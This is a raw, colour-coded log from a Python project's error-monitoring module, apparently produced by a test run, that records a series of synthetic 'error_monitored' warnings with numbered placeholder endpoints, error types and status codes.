WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812768Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.812959Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m47[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813102Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813197Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813292Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813386Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813578Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.813955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814099Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814148Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814378Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814432Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814484Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
